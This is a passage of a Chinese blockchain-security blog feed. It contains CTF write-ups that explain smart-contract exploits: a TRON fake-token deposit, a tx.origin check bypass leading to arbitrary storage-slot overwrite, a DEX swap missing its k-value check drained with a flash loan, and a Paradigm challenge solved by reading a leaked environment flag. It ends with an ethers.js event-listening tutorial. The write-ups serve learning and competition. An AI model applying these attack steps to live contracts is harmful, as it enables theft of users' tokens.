alt=""></p><p>经过分析发现，该假币漏洞是由于invest函数只判断了msg.tokenvalue，而没有判断msg.tokenid是否为真实BTT代币的ID：1002000所导致。</p><p>TRC10标准是波场本身支持的技术代币标准，标准规定了两个重要参数：msg.tokenvalue和msg.tokenid。其中msg.tokenvalue表示当前msg调用的代币数量，而msg.tokenid表示当前调用者使用的代币种类标记ID。每种TRC10标准的代币都有一个独一无二的标记ID作为代币种类证明。</p><p>这个invest函数如果放在以太坊当中，没有一点问题，但是在波场的token机制当中，这样写是有严重漏洞的，此invest函数没有对收到代币的资质（tokenid）进行检查，这导致攻击者可以自己发行一个通证，通过自己这个没有实际价值的token去调用invest函数，导致BTT合约误认为攻击者的FakeToken是具有价值的BTTToken</p>]]></content>
      
      
      <categories>
          
          <category> TRON </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TRON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可信链攻防ctf——决赛solidity题解</title>
      <link href="/%E5%86%B3%E8%B5%9B%E9%A2%98%E8%A7%A3/"/>
      <url>/%E5%86%B3%E8%B5%9B%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<hr><pre><code>author：Thomas_Xu</code></pre><h1 id="中国可信区块链攻防大赛——决赛solidity题解"><a href="#中国可信区块链攻防大赛——决赛solidity题解" class="headerlink" title="中国可信区块链攻防大赛——决赛solidity题解"></a>中国可信区块链攻防大赛——决赛solidity题解</h1><p>前一段时间没有更新，其实是去参加中国可信链攻防大赛了，作为本届大赛唯一的本科生队伍，我们已经做得足够好了，初赛满分，决赛一天时间 9个题解出5个题。如果时间足够，我认为是有可能全解的。</p><p>这里我只分析我做的两个chanllenge</p><h2 id="ApproveMain"><a href="#ApproveMain" class="headerlink" title="ApproveMain"></a>ApproveMain</h2><h2 id="漏洞点：grant导致任意的slot覆盖"><a href="#漏洞点：grant导致任意的slot覆盖" class="headerlink" title="漏洞点：grant导致任意的slot覆盖"></a>漏洞点：grant导致任意的slot覆盖</h2><h3 id="题意分析："><a href="#题意分析：" class="headerlink" title="题意分析："></a>题意分析：</h3><p>此题的Cert是一个实现了所有基础功能的代币合约，在创建此token时，自动获得100ETH</p><p><img src="complete.png" alt=""></p><p>目标是使cert.balanceOf(address(this))==0</p><p>此合约还有一个getToken公开函数，每次只能向调用者发送自己一半的余额。（没用）</p><p>而Cert函数里面有一个admin参数，没有在任意一个地方被赋值，但是却有地方使用admin作为权限检查。</p><p>这给了我一个很大的思路，也许我们可以通过某种方式获得admin权限？</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="safecheck.png" alt=""></p><p>这里定义了一个safeCheek的修饰符，用于approve函数的权限管理。但这里的判断明显是个弱检查，并且使用了tx.orgin作为身份验证（检查是否以0x5B38Da开头），这样的做法相当危险，我们不仅可以通过Create2跑靓号，也可以使用钓鱼攻击来绕过这个权限。巧合的是remix本地节点的第一个账户就以“0x5B38Da”开头。省去了做题时不必要的麻烦。</p><p>如果不满足条件，就会执行一个有巨大权力的grant函数，这也是此题薄弱点所在。</p><p><img src="grant.png" alt=""></p><p>让我们看看grant函数到底干了什么</p><p>这里的逻辑使用了slot来给变量赋值，但是并没有进行任何的检查，也就是说我们可以通过此函数，覆盖任何我们想要覆盖的变量，只需要绕过require即可。</p><p>那么现在此题的关键就来到了怎么绕过这个require</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(spender.code.length&gt;0&amp;&amp;spender.code.length&lt;10);</span><br></pre></td></tr></table></figure><p>这里要求spender地址的编译时字节码需要在0~10之间</p><p>这个条件其实是十分苛刻的，spender既不能是EOA账户，也不能是普通的合约账户</p><ul><li><p><strong>try</strong></p><p>我们发现即使是一个空合约，也有至少18的字节码长度。于是尝试使用EVM低级语言写一个简单合约：</p><p><img src="Huff1.png" alt=""></p><p><img src="Huff2.png" alt=""></p><p>我尝试使用Huff语言写一个空合约，</p></li></ul><p>​        <img src="bytecode.png" alt=""></p><p>​        </p><p>​        让我很失望的是即使是这样，字节码长度任然大于10</p><ul><li>​    最后我在无比绝望当中尝试着直接删除中间部分的字节码强行使长度小于10，编译，通过！！</li></ul><p>​        <img src="Deploy.png" alt=""></p><p>​        没想到这样可以直接生成一个指定字节码长度的地址</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p><img src="Exploit.png" alt=""></p><p>按照以上的分析思路，我们可以知道，第一次执行approve的时候只要想办法进去到grant然后就可以覆盖任意slot位置的值。</p><p>那我们的传参如下：</p><p>address:刚刚生成的字节码长度小于10的地址，和admin参数所在的slot位置。</p><p>uint256: admin参数的slot地址</p><p><img src="Transfer.png" alt=""></p><p>由于题目中的transferfrom要求to的地址必须是EOA账户，所以我们只能在最后手动调用transferfrom函数掏空合约的token。</p><h2 id="第四题："><a href="#第四题：" class="headerlink" title="第四题："></a>第四题：</h2><h3 id="漏洞点：cheapswap缺少k值检查"><a href="#漏洞点：cheapswap缺少k值检查" class="headerlink" title="漏洞点：cheapswap缺少k值检查"></a>漏洞点：cheapswap缺少k值检查</h3><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个题实现了一个简单的DEX，重写的Uniswapv2部分代码，并提供了一个闪电贷。</p><p>这个题的漏洞是出现在pair合约中改写了uniswapv2中的swap基础函数，实现了一个cheapswap。</p><p><strong>但是这个cheapswap没有进行k值检查</strong>，他是通过<strong>onlyRouter</strong>来防止有人直接调用cheapswap从而直接获利。</p><p><strong>这个合约最大的问题就是改写swap的同时，没有把以前的swap给删掉</strong></p><p>通过以上分析我们可以知道攻击者在一次代币兑换过程中分别通过调用 swap 函数与 cheapSwap 函数进行两次代币兑换操作，理论上每次兑换操作都将导致 K 值的变化，最终使得用户无法获得预期的代币。但是这个cheapswap并没有进行k值检查，导致我们可以在一次兑换中获得额外的token。</p><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>1 、先通过 config的 闪电贷借出 TTtoken</p><p>2、创建恶意的代币合约 Mytoken，并在 Dex 中添加了 Mytoken 代币与 ttToken 代币流动性。</p><p>3、通过 Mytoken -&gt; TTtoken -&gt; USDT 路径进行 Mytoken 代币到 USDT 代币的兑换，并在 Mytoken 代币转入 Pair 合约兑换成 TTtoken 代币的过程中进行了一次 TTtoken 代币与 USDT 的兑换操作，随后再进行正常的 cheapSwap 操作。最终获得了额外的token。</p><p><img src="TTCall.png" alt=""></p><p>顺带提一句，这个题其实是真实的攻击事件Impossible token的bsc被盗的改编。</p>]]></content>
      
      
      <categories>
          
          <category> 可信链攻防ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 可信链攻防ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Paradigm 题解 trapdoor</title>
      <link href="/paradigm22-trapdoor/"/>
      <url>/paradigm22-trapdoor/</url>
      
        <content type="html"><![CDATA[<h1 id="paradigm-2022-ctf-题解——Trapdoor"><a href="#paradigm-2022-ctf-题解——Trapdoor" class="headerlink" title="paradigm 2022 ctf 题解——Trapdoor"></a>paradigm 2022 ctf 题解——Trapdoor</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这个挑战让我挺恼火的，因为这个挑战赛的结构与其他挑战赛完全不同。虽然仍然有通常的<em>chal.py</em>脚本来设置，但这次没有<em>Setup.sol</em>。取而代之的是<em>Script.sol</em>，熟悉Foundry的人应该很快意识到，这不应该部署在任何地方。这些脚本仅在开发环境中本地执行，无需在开发过程中在不同语言之间切换。</p><p>有关foundry的知识可以参考我上一篇文章<a href="https://thomasxu-blockchain.github.io/Foundry/">Foundry介绍</a></p><p>先来看python脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> eth_sandbox</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">FLAG = os.getenv(<span class="string">"FLAG"</span>, <span class="string">"PCTF&#123;placeholder&#125;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_factorize_action</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">()</span> -&gt; int:</span></span><br><span class="line">        ticket = eth_sandbox.check_ticket(input(<span class="string">"ticket please: "</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ticket:</span><br><span class="line">            print(<span class="string">"invalid ticket!"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ticket.challenge_id != eth_sandbox.CHALLENGE_ID:</span><br><span class="line">            print(<span class="string">"invalid ticket!"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        runtime_code = input(<span class="string">"runtime bytecode: "</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 转二进制</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            binascii.unhexlify(runtime_code)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"runtime code is not hex!"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 读取Script.sol</span></span><br><span class="line">        <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> tempdir:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"./Script.sol"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                script = f.read()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 生成两个 128 位素数</span></span><br><span class="line">            a = number.getPrime(<span class="number">128</span>)</span><br><span class="line">            b = number.getPrime(<span class="number">128</span>)</span><br><span class="line">            <span class="comment"># 替换两个占位符为str(a * b)和runtime_code</span></span><br><span class="line">            script = script.replace(<span class="string">"NUMBER"</span>, str(a * b)).replace(<span class="string">"CODE"</span>, runtime_code)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 将此更新版本写入随机临时目录</span></span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">f"<span class="subst">&#123;tempdir&#125;</span>/Script.sol"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(script)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 运行更新的脚本forge script Script.sol --tc Script</span></span><br><span class="line">            p = subprocess.run(</span><br><span class="line">                args=[</span><br><span class="line">                    <span class="string">"/root/.foundry/bin/forge"</span>,</span><br><span class="line">                    <span class="string">"script"</span>,</span><br><span class="line">                    <span class="string">"Script.sol"</span>,</span><br><span class="line">                    <span class="string">"--tc"</span>,</span><br><span class="line">                    <span class="string">"Script"</span>,</span><br><span class="line">                ],</span><br><span class="line">                cwd=tempdir,</span><br><span class="line">                stdout=subprocess.PIPE,</span><br><span class="line">                stderr=subprocess.PIPE,</span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            print()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 检查进程的返回代码是否成功</span></span><br><span class="line">            <span class="keyword">if</span> p.returncode != <span class="number">0</span>:</span><br><span class="line">                print(<span class="string">"failed to run script"</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 从伪造标准输出中获取最后一行</span></span><br><span class="line">            result = p.stdout.decode(<span class="string">"utf8"</span>).strip().split(<span class="string">"\n"</span>)[<span class="number">-1</span>].strip()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 打印最后一行</span></span><br><span class="line">            print(result)</span><br><span class="line">            <span class="comment"># 检查最后一行是否以字符串“你分解了数字！”开头，如果是，将打印挑战的标志</span></span><br><span class="line">            <span class="keyword">if</span> result.startswith(<span class="string">"you factored the number!"</span>):</span><br><span class="line">                print(FLAG)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eth_sandbox.Action(name=<span class="string">"factorize"</span>, handler=action)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eth_sandbox.run_launcher([</span><br><span class="line">    new_factorize_action(),</span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>关键的检查在最后：</p><p>检查最后一行是否以字符串<em>“你分解了数字！”</em>开头，如果是，将打印挑战的<em>标志</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; From Script.sol</span><br><span class="line">interface FactorizorLike &#123;</span><br><span class="line">    function factorize(uint) external pure returns (uint, uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    constructor(bytes memory code) &#123; assembly &#123; return (add(code, 0x20), mload(code)) &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Script &#123;</span><br><span class="line">    function run() external &#123;</span><br><span class="line">        uint expected &#x3D; NUMBER;</span><br><span class="line"></span><br><span class="line">        FactorizorLike factorizer &#x3D; FactorizorLike(address(new Deployer(hex&quot;CODE&quot;)));</span><br><span class="line">        (uint a, uint b) &#x3D; factorizer.factorize(expected);</span><br><span class="line"></span><br><span class="line">        if (a &gt; 1 &amp;&amp; b &gt; 1 &amp;&amp; a !&#x3D; expected &amp;&amp; b !&#x3D; expected &amp;&amp; a !&#x3D; b &amp;&amp; expected % a &#x3D;&#x3D; 0 &amp;&amp; expected % b &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            console.log(&quot;you factored the number! %d * %d &#x3D; %d&quot;, a, b, expected);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(&quot;you didn&#39;t factor the number. %d * %d !&#x3D; %d&quot;, a, b, expected);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<em>Script.sol</em>中，我们可以找到 NUMBER 和 CODE 占位符。</p><p>运行时，我们提供的字节码通过部署程序合约进行<em>部署</em>。其构造函数中的程序集将确保返回和部署我们的运行时字节码，而不是原始<em>部署者的</em>运行时字节码（由于它没有函数，因此几乎是空的）。</p><p>然后<em>factorize（）</em> 函数在我们部署的字节码上被调用，它应该返回两个数字。基本上，我们应该找到原始的两个相乘导致<em>NUMBER</em>的数字，并确保我们没有作弊，进行了几次检查。</p><p>有趣的是，我们的脚本找到的两个数字如何作为两个日志消息的一部分返回。由于最后一条消息已打印，我们将能够看到字节码最终选择的数字。</p><p>在Foundry中的console.log()功能，它们和Hardhat中基本相同。但是——这里没有直接导入console库，而是重新实现了一个console库。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// From Script.sol</span></span><br><span class="line">library <span class="built_in">console</span> &#123;</span><br><span class="line">    address constant CONSOLE_ADDRESS = address(<span class="number">0x000000000000000000636F6e736F6c652e6c6f67</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_sendLogPayload</span>(<span class="params">bytes memory payload</span>) <span class="title">private</span> <span class="title">view</span> </span>&#123;</span><br><span class="line">        uint256 payloadLength = payload.length;</span><br><span class="line">        address consoleAddress = CONSOLE_ADDRESS;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">let</span> payloadStart := add(payload, <span class="number">32</span>)</span><br><span class="line">            <span class="keyword">let</span> r := staticcall(gas(), consoleAddress, payloadStart, payloadLength, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">string memory p0, uint256 p1, uint256 p2, uint256 p3</span>) <span class="title">internal</span> <span class="title">view</span> </span>&#123;</span><br><span class="line">        _sendLogPayload(abi.encodeWithSignature(<span class="string">"log(string,uint,uint,uint)"</span>, p0, p1, p2, p3));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>而这个题的解决思路居然是因为 python 的子进程运行泄漏了 FLAG 环境变量，我们可以使用Foundry的作弊码来读取环境变量FLAG，有关Foundry作弊码的更多信息：<a href="https://book.getfoundry.sh/cheatcodes/" target="_blank" rel="noopener">FoundryBook</a></p><p><img src="trapdoor.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paradigm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合约事件的监听</title>
      <link href="/eventListen/"/>
      <url>/eventListen/</url>
      
        <content type="html"><![CDATA[<h1 id="合约事件的监听"><a href="#合约事件的监听" class="headerlink" title="合约事件的监听"></a>合约事件的监听</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>这两天在研究js中各种对事件的监听方式，并试图找出其中的不同。接下来会逐一对事件的监听方式进行解析。</p><h2 id="事件和日志的区别"><a href="#事件和日志的区别" class="headerlink" title="事件和日志的区别"></a>事件和日志的区别</h2><p>在介绍事件的监听前，我们先明确事件，日志这两个概念。事件发生后被记录到区块链上成为了日志。总的来说，事件强调功能，一种行为；日志强调存储，内容。</p><p>事件是以太坊EVM提供的一种日志基础设施。事件可以用来做操作记录，存储为日志。也可以用来实现一些交互功能，比如通知UI，返回函数调用结果等</p><h2 id="事件的监听"><a href="#事件的监听" class="headerlink" title="事件的监听"></a>事件的监听</h2><p>我们在ether.js中可以直接使用<code>contract.on</code>函数对当前合约事件进行监听。但是<code>contract.on</code>函数只会监听当前区块的该合约事件，后面会讲解查询历史所有事件的方法。</p><p>此函数的应用场景：</p><p>在一个非view函数中如果想要获取合约中的某个变量的值，是需要发送交易的，很明显，这样的操作不划算。那么我们可以用一种更优雅的方式获取这样的数据。</p><p>通过事件的形式。（但这样的形式会带来新的问题，由于合约发送事件是需要在链上保存日志的，这也会带来花费，这就需要在两个需求之间进行自己的权衡了）</p><p>日志的gas花费成本：<br><img src="Log_gas.png" alt=""><br>根据黄皮书、日志的基础成本是375 gas 。另外每个的主题需要额外支付375 gas 的费用。最后，每个字节的数据需要<strong>8个 gas</strong>。<br><img src="Log_gas1.png" alt=""></p><p>这实际上很便宜！日志是一种以少量价格将少量数据存储在以太坊区块链上的优雅方法。</p><p>示例合约：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    event Return(uint256 num);</span><br><span class="line">    uint256 _accum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">increment</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint256 </span>) </span>&#123;</span><br><span class="line">        _accum++;</span><br><span class="line">        emit Return(_accum);</span><br><span class="line">        <span class="keyword">return</span> _accum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用ether.js监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">const &#123; expect &#125; &#x3D; require(&quot;chai&quot;);</span><br><span class="line">const &#123; Contract &#125; &#x3D; require(&quot;ethers&quot;);</span><br><span class="line">const &#123; ethers &#125; &#x3D; require(&#39;hardhat&#39;);</span><br><span class="line"></span><br><span class="line">describe(&quot;Example test&quot;, function () &#123;</span><br><span class="line">    let contractAddress &#x3D; &quot;0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9&quot;</span><br><span class="line"></span><br><span class="line">    const tokenAbi &#x3D;[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;anonymous&quot;: false,</span><br><span class="line">            &quot;inputs&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;indexed&quot;: false,</span><br><span class="line">                    &quot;internalType&quot;: &quot;uint256&quot;,</span><br><span class="line">                    &quot;name&quot;: &quot;num&quot;,</span><br><span class="line">                    &quot;type&quot;: &quot;uint256&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            &quot;name&quot;: &quot;Return&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;event&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;inputs&quot;: [],</span><br><span class="line">            &quot;name&quot;: &quot;increment&quot;,</span><br><span class="line">            &quot;outputs&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;internalType&quot;: &quot;uint256&quot;,</span><br><span class="line">                    &quot;name&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;type&quot;: &quot;uint256&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            &quot;stateMutability&quot;: &quot;nonpayable&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;function&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">    let provider &#x3D; new ethers.providers.JsonRpcProvider(&#39;http:&#x2F;&#x2F;localhost:8545&#39;)</span><br><span class="line">    let privKey &#x3D; &#39;&#39;</span><br><span class="line">    let wallet &#x3D; new ethers.Wallet(privKey,provider)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    it(&quot;should fire the event&quot;, async function () &#123;</span><br><span class="line">        &#x2F;&#x2F;修改轮询时间?</span><br><span class="line">        &#x2F;&#x2F; const provider &#x3D; ethers.provider;</span><br><span class="line">        &#x2F;&#x2F; provider.pollingInterval &#x3D; 100;</span><br><span class="line">        const [deployer] &#x3D;   await ethers.getSigners();</span><br><span class="line">        const TokenContract &#x3D; new ethers.Contract(contractAddress, tokenAbi, deployer);</span><br><span class="line">        contractSigner &#x3D; TokenContract.connect(wallet)</span><br><span class="line">        &#x2F;&#x2F;触发contract.on事件</span><br><span class="line">        contractSigner.on(&quot;Return&quot;, (num) &#x3D;&gt; &#123;</span><br><span class="line">            console.log(&#39;The event data is&#39;, num)</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        await contractSigner.increment()</span><br><span class="line">        &#x2F;&#x2F;等待5秒，因为ether.js的轮询时间为4s</span><br><span class="line">        await new Promise(res &#x3D;&gt; setTimeout(() &#x3D;&gt; res(null), 5000));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这里有一个轮询时间的概念，默认情况下，ethers.js使用轮询来获取事件，轮询间隔是4秒，所以您在测试的末尾添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;等待5秒，因为ether.js的轮询时间为4s</span><br><span class="line">await new Promise(res &#x3D;&gt; setTimeout(() &#x3D;&gt; res(null), 5000));</span><br></pre></td></tr></table></figure><p>然而！您还可以调整给定合约的轮询间隔，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const provider &#x3D; greeter.provider as EthersProviderWrapper;</span><br><span class="line">provider.pollingInterval &#x3D; 100;</span><br></pre></td></tr></table></figure><h2 id="历史事件的查询"><a href="#历史事件的查询" class="headerlink" title="历史事件的查询"></a>历史事件的查询</h2><p>不管是web3.js还是ether.js都给我们提供了很全的库来查询历史交易</p><h4 id="web3-js"><a href="#web3-js" class="headerlink" title="web3.js"></a>web3.js</h4><p>在web3.js中使用<code>contract.getPastEvents</code>函数来读取合约历史事件</p><p>调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myContract.getPastEvents(event[, options][, callback])</span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>event - String: 事件名，或者使用 “allEvents” 来读取所有的事件</li><li>options - Object: 用于部署的选项，包含以下字段：<ul><li>filter - Object : 可选，按索引参数过滤事件，例如 {filter: {myNumber: [12,13]}} 表示所有“myNumber” 为12 或 13的事件</li><li>fromBlock - Number : 可选，仅读取从该编号开始的块中的历史事件。</li><li>toBlock - Number : 可选，仅读取截止到该编号的块中的历史事件，默认值为”latest”</li><li>topics - Array : 可选，用来手动设置事件过滤器的主题。如果设置了filter属性和事件签名，那么(topic[0])将不会自动设置</li></ul></li><li>callback - Function : 可选的回调参数，触发时其第一个参数为错误对象，第二个参数为历史事件数组</li></ul><p><strong>返回值：</strong></p><p>一个Promise对象，其解析值为历史事件对象数组</p><p>使用<code>contract.getPastEvents</code>监听：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 